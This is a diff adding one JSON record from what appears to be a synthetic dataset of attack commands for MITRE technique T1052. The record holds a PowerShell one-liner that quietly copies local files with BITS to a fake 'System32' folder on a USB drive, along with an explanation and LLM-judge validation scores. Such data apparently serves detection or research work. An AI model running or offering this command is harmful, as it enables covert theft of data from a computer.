@@ -1,0 +1,57 @@
+{
+  "technique_id": "T1052",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "$dl=(Get-Volume | Where-Object {$_.DriveType -eq 'Removable'} | Select-Object -First 1 -ExpandProperty DriveLetter); New-Item -Path \"$dl:\\System32\" -ItemType Directory -Force | Out-Null; Start-BitsTransfer -Source \"C:\\SourceData\\*\" -Destination \"$dl:\\System32\" -Priority Low",
+  "explanation": "Uses BITS to transfer local files quietly to a system-sounding folder on a USB device, keeping activity local and resilient.",
+  "rationale_steps": [
+    "Resolve the removable drive letter.",
+    "Create a plausible destination folder on the USB.",
+    "Use BITS to copy local files to the removable device."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1052-5d877001-88b580d5",
+  "source_prompt_hash": "5d877001",
+  "timestamp_utc": "2025-09-30T05:25:30.107478Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "PowerShell command is well-formed with balanced quotes, valid cmdlets/parameters, and proper separators/pipelines.",
+        "semantic_score": 5,
+        "semantic_justification": "It locates a removable drive, creates a plausible directory, and uses BITS to quietly copy local files there, aligning with physical media exfiltration without requiring elevated privileges.",
+        "combined_score": 5.0,
+        "confidence": 0.9,
+        "timestamp": "2025-10-01T07:02:53.647475Z"
+      },
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with proper PowerShell syntax, balanced parentheses, correct variable assignment, piping, and proper use of cmdlets with their parameters.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly aligns with T1052 by automatically identifying a removable drive, creating a deceptive system-like folder, and using BITS transfer (which operates in the background with low priority) to exfiltrate data to the physical medium.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-01T07:02:56.529738Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed, using correct Powershell syntax, balanced parentheses, valid cmdlets, and proper parameter formatting.",
+        "semantic_score": 5,
+        "semantic_justification": "The command directly facilitates exfiltration to a removable physical medium by identifying a USB drive, creating an obfuscated system-sounding folder, and using BITS for quiet, resilient file transfer, perfectly aligning with T1052.",
+        "combined_score": 5.0,
+        "confidence": 1,
+        "timestamp": "2025-10-01T07:03:05.793902Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 5.0,
+    "llm_average_score": 5.0,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
